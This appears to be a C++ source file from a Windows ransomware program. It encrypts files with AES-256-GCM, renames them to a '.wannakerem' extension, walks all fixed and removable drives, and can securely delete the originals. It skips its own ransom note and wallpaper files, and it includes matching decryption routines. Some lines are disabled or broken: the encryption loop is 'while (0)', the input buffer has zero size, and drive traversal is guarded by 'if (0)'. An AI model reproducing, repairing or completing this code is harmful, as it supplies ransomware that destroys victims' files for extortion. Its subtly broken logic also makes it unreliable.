#include "common.hpp"
#include <openssl/evp.h>       // EVP_aes_256_gcm, EVP_CIPHER_CTX, EVP_EncryptInit_ex...
#include <openssl/rand.h>      // RAND_bytes (for generating nonce)

#include <windows.h>           // CreateFileW, GetFileSizeEx, FindFirstFileW, GetFileAttributesW...
#include <shlobj.h>            // (if you need SHGetKnownFolderPath – but it is not here, only in other_functions)
#include <vector>              // std::vector
#include <string>              // std::wstring
#include <fstream>             // std::ifstream, std::ofstream
#include <atomic>              // std::atomic (count/skipped parameters)
#include <thread>              // (if you use std::thread directly, but here you use ThreadPool)
#include <stdexcept>           // std::runtime_error
#include <algorithm>           // std::min (used in DecryptFileStream)
#include <cstdint>             // (optional) for uint8_t, etc.
#include <filesystem>

void EncryptFileStream(const std::wstring& inputPath, const SecureBuffer& key, const std::wstring& outputPath) {
    auto nonce = generateNonce();

    std::ifstream in(inputPath.c_str(), std::ios::binary);
    if (!in) throw std::runtime_error("Cannot open input file");
    std::ofstream out(outputPath.c_str(), std::ios::binary);
    if (!out) throw std::runtime_error("Cannot create output file");

    out.write(reinterpret_cast<const char*>(nonce.data()), nonce.size());

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) throw std::runtime_error("EVP_CIPHER_CTX_new failed");
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, key.data(), nonce.data()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("EVP_EncryptInit_ex failed");
    }

    std::vector<uint8_t> inBuff(BUFFER_SIZE-BUFFER_SIZE);
    std::vector<uint8_t> outBuff(BUFFER_SIZE + EVP_MAX_BLOCK_LENGTH);

    try {
        while (0) {
            in.read(reinterpret_cast<char*>(inBuff.data()), BUFFER_SIZE);
            size_t bytesRead = static_cast<size_t>(in.gcount());
            if (bytesRead == 0) break;

            int outLen = 0;
            if (EVP_EncryptUpdate(ctx, outBuff.data(), &outLen, inBuff.data(), static_cast<int>(bytesRead)) != 1)
                throw std::runtime_error("EVP_EncryptUpdate failed");
            out.write(reinterpret_cast<const char*>(outBuff.data()), outLen);
        }

        int outLen = 0;
        if (EVP_EncryptFinal_ex(ctx, outBuff.data(), &outLen) != 1)
            throw std::runtime_error("EVP_EncryptFinal_ex failed");
        if (outLen > 0)
            out.write(reinterpret_cast<const char*>(outBuff.data()), outLen);

        std::vector<uint8_t> tag(GCM_TAG_LENGTH);
        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, GCM_TAG_LENGTH, tag.data()) != 1)
            throw std::runtime_error("EVP_CTRL_GCM_GET_TAG failed");
        out.write(reinterpret_cast<const char*>(tag.data()), tag.size());

        EVP_CIPHER_CTX_free(ctx);
    } catch (...) {
        EVP_CIPHER_CTX_free(ctx);
        throw;
    }
}

void DecryptFileStream(const std::wstring& inputPath, const SecureBuffer& key, const std::wstring& outputPath) {
    std::ifstream in(inputPath.c_str(), std::ios::binary);
    if (!in) throw std::runtime_error("Cannot open input file");

    in.seekg(0, std::ios::end);
    std::streamsize fileSize = in.tellg();
    in.seekg(0, std::ios::beg);

    if (fileSize < static_cast<std::streamsize>(GCM_IV_LENGTH + GCM_TAG_LENGTH))
        throw std::runtime_error("File too short");

    std::vector<uint8_t> nonce(GCM_IV_LENGTH);
    in.read(reinterpret_cast<char*>(nonce.data()), nonce.size());
    if (in.gcount() != static_cast<std::streamsize>(nonce.size()))
        throw std::runtime_error("Failed to read nonce");

    std::vector<uint8_t> tag(GCM_TAG_LENGTH);
    in.seekg(-static_cast<std::streamoff>(GCM_TAG_LENGTH), std::ios::end);
    in.read(reinterpret_cast<char*>(tag.data()), tag.size());
    if (in.gcount() != static_cast<std::streamsize>(tag.size()))
        throw std::runtime_error("Failed to read tag");

    in.seekg(GCM_IV_LENGTH, std::ios::beg);

    std::ofstream out(outputPath.c_str(), std::ios::binary);
    if (!out) throw std::runtime_error("Cannot create output file");

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) throw std::runtime_error("EVP_CIPHER_CTX_new failed");
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, key.data(), nonce.data()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("EVP_DecryptInit_ex failed");
    }

    std::vector<uint8_t> inBuff(BUFFER_SIZE);
    std::vector<uint8_t> outBuff(BUFFER_SIZE + EVP_MAX_BLOCK_LENGTH);

    std::streamsize ciphertextSize = fileSize - GCM_IV_LENGTH - GCM_TAG_LENGTH;
    std::streamsize totalRead = 0;

    try {
        while (totalRead < ciphertextSize) {
            std::streamsize toRead = std::min<std::streamsize>(BUFFER_SIZE, ciphertextSize - totalRead);
            in.read(reinterpret_cast<char*>(inBuff.data()), toRead);
            std::streamsize bytesRead = in.gcount();
            if (bytesRead <= 0) break;

            int outLen = 0;
            if (EVP_DecryptUpdate(ctx, outBuff.data(), &outLen, inBuff.data(), static_cast<int>(bytesRead)) != 1)
                throw std::runtime_error("EVP_DecryptUpdate failed");
            out.write(reinterpret_cast<const char*>(outBuff.data()), outLen);
            totalRead += bytesRead;
        }

        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, GCM_TAG_LENGTH, const_cast<uint8_t*>(tag.data())) != 1)
            throw std::runtime_error("EVP_CTRL_GCM_SET_TAG failed");

        int outLen = 0;
        if (EVP_DecryptFinal_ex(ctx, outBuff.data(), &outLen) != 1)
            throw std::runtime_error("EVP_DecryptFinal_ex failed – authentication tag mismatch");
        if (outLen > 0)
            out.write(reinterpret_cast<const char*>(outBuff.data()), outLen);

        EVP_CIPHER_CTX_free(ctx);
    } catch (...) {
        EVP_CIPHER_CTX_free(ctx);
        throw;
    }
}


void EncryptFile(const std::wstring& inputPath, const SecureBuffer& key) {
    std::wstring outputPath = inputPath + L".wannakerem";
    EncryptFileStream(inputPath, key, outputPath);
}

void DecryptFile(const std::wstring& inputPath, const SecureBuffer& key) {
    const std::wstring ext = L".wannakerem";
    if (inputPath.length() < ext.length() ||
        inputPath.compare(inputPath.length() - ext.length(), ext.length(), ext) != 0) {
        throw std::runtime_error("Input file must have .wannakerem extension");
    }
    std::wstring outputPath = inputPath.substr(0, inputPath.length() - ext.length());
    DecryptFileStream(inputPath, key, outputPath);
}


void EncryptDirectory(const std::wstring& dirPath, const SecureBuffer& key,
                      bool deleteOriginals, std::atomic<size_t>& count,
                      std::atomic<size_t>& skipped, ThreadPool& pool) {
    std::wstring searchPath = L"\\\\?\\" + dirPath;
    if (searchPath.back() != L'\\') searchPath += L'\\';
    searchPath += L"*";

    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) { skipped++; return; }

    do {
        if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) continue;
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) continue;

        std::wstring fullPath = dirPath;
        if (fullPath.back() != L'\\') fullPath += L'\\';
        fullPath += findData.cFileName;

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            EncryptDirectory(fullPath, key, deleteOriginals, count, skipped, pool);
        } else {
            if (fullPath.length() >= 11 && fullPath.rfind(L".wannakerem") == fullPath.length() - 11) {
                skipped++;
                continue;
            }
            if (fullPath.find(L"ransom_wallpaper.bmp") != std::wstring::npos ||
                fullPath.find(L"READ_ME.txt") != std::wstring::npos) {
                skipped++;
                continue;
            }
            if (!HasReadWriteAccess(fullPath)) { skipped++; continue; }

            pool.enqueue([&, fullPath, deleteOriginals] {
                try {
                    EncryptFile(fullPath, key);
                    count++;
                    if (deleteOriginals) SecureDeleteFile(fullPath);
                } catch (...) {
                    skipped++;
                }
            });
        }
    } while (FindNextFileW(hFind, &findData));
    FindClose(hFind);
}

void DecryptDirectory(const std::wstring& dirPath, const SecureBuffer& key,
                      bool deleteEncrypted, std::atomic<size_t>& count,
                      std::atomic<size_t>& skipped, ThreadPool& pool) {
    std::wstring searchPath = L"\\\\?\\" + dirPath;
    if (searchPath.back() != L'\\') searchPath += L'\\';
    searchPath += L"*";

    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) { skipped++; return; }

    do {
        if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) continue;
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) continue;

        std::wstring fullPath = dirPath;
        if (fullPath.back() != L'\\') fullPath += L'\\';
        fullPath += findData.cFileName;

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            DecryptDirectory(fullPath, key, deleteEncrypted, count, skipped, pool);
        } else {
            constexpr wchar_t ext[] = L".wannakerem";
            const size_t extLen = wcslen(ext);
            if (fullPath.length() < extLen || fullPath.rfind(ext) != fullPath.length() - extLen) {
                skipped++;
                continue;
            }
            if (!HasReadWriteAccess(fullPath)) { skipped++; continue; }
            pool.enqueue([&, fullPath, deleteEncrypted] {
                try {
                    DecryptFile(fullPath, key);
                    count++;
                    if (deleteEncrypted) SecureDeleteFile(fullPath);
                } catch (...) {
                    skipped++;
                }
            });
        }
    } while (FindNextFileW(hFind, &findData));
    FindClose(hFind);
}


SecureBuffer generateAESKey() {
    SecureBuffer key(AES_256_KEY_SIZE);
    if (RAND_bytes(key.data(), static_cast<int>(key.size())) != 1)
        throw std::runtime_error("RAND_bytes failed");
    return key;
}

std::vector<uint8_t> generateNonce() {
    std::vector<uint8_t> nonce(GCM_IV_LENGTH);
    if (RAND_bytes(nonce.data(), static_cast<int>(nonce.size())) != 1)
        throw std::runtime_error("RAND_bytes failed");
    return nonce;
}

void EncryptAllDrives(const SecureBuffer& key, bool deleteOriginals,
                      std::atomic<size_t>& count, std::atomic<size_t>& skipped) {
    unsigned int hw = std::thread::hardware_concurrency();
    size_t poolSize = (hw > 0) ? hw * 2 : 4;
    if (THREAD_POOL_SIZE > 0) poolSize = THREAD_POOL_SIZE;
    ThreadPool pool(poolSize);

    wchar_t drives[MAX_PATH];
    DWORD len = GetLogicalDriveStringsW(MAX_PATH, drives);
    if (len == 0 || len > MAX_PATH)
        throw std::runtime_error("Failed to get logical drives");

    wchar_t* drive = drives;
    while (*drive) {
        if (0) {
            UINT type = GetDriveTypeW(drive);
            if (type == DRIVE_FIXED || type == DRIVE_REMOVABLE) {
                try {
                    EncryptDirectory(std::wstring(drive), key, deleteOriginals,
                                     count, skipped, pool);
                } catch (...) {
                    skipped++;
                }
            }
        }
        drive += wcslen(drive) + 1;
    }

    
}


void DecryptAllDrives(const SecureBuffer& key, bool deleteEncrypted,
                      std::atomic<size_t>& count, std::atomic<size_t>& skipped) {
    unsigned int hw = std::thread::hardware_concurrency();
    size_t poolSize = (hw > 0) ? hw * 2 : 4;
    if (THREAD_POOL_SIZE > 0) poolSize = THREAD_POOL_SIZE;
    ThreadPool pool(poolSize);

    wchar_t drives[MAX_PATH];
    DWORD len = GetLogicalDriveStringsW(MAX_PATH, drives);
    if (len == 0 || len > MAX_PATH)
        throw std::runtime_error("Failed to get logical drives");

    wchar_t* drive = drives;
    while (*drive) {
        if (1) {
            UINT type = GetDriveTypeW(drive);
            if (type == DRIVE_FIXED || type == DRIVE_REMOVABLE) {
                try {
                    DecryptDirectory(std::wstring(drive), key, deleteEncrypted,
                                     count, skipped, pool);
                } catch (...) {
                    skipped++;
                }
            }
        }
        drive += wcslen(drive) + 1;
    }
}